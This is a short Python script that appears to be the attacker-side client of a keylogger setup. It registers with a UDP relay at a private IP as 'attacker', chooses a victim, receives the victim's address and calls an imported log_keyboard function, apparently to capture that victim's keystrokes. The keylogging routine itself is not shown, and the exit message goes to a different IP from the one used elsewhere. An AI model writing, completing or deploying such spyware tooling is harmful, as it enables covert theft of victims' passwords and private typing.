import socket
import time
import threading
from functions import log_keyboard


def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto("attacker".encode(), ("192.168.1.211", 8200))
    a = client.recvfrom(1024)[0].decode()
    print(a)
    choice = int(input('choose')) - 1
    client.sendto(f"choice{choice}".encode(), ("192.168.1.211", 8200))
    a = client.recvfrom(1024)[0].decode()
    print(a)
    c, ip_of_victim = client.recvfrom(1024)
    print(c)
    # threading.Thread(target=log_keyboard, args=(client, ip_of_victim), daemon=False).start()
    log_keyboard(client, ip_of_victim)
    client.sendto("attacker exit".encode(), ("192.168.1.240", 8200))
    client.close()


if __name__ == '__main__':
    main()
